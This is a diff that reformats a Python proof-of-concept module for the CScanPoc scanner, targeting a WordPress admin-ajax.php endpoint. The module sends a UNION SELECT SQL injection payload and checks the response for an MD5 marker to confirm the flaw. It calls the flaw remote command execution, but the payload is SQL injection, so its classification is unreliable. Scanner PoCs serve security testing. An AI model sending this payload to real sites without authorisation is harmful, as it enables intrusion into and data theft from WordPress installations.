@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0045' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0045'  # 平台漏洞编号，留空
     name = 'WordPress 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         WordPress /wp-admin/admin-ajax.php页面可执行任意代码，造成远程命令执行漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '3f785041-cbbf-4e69-a092-bb20453cff73'
@@ -30,13 +32,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/wp-admin/admin-ajax.php?action=rss&type=video&vid=11/**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,17,8,9,0,1,2,3,4,5,6,27,8,9,0,1,2,3,4,5,6,md5(521521),8,9%23'
             verify_url = self.target + payload
             r = requests.get(verify_url)
 
             if r.status_code == 200 and '35fd19fbe470f0cb5581884fa700610f' in r.content:
-                #security_hole(verify_url)
+                # security_hole(verify_url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
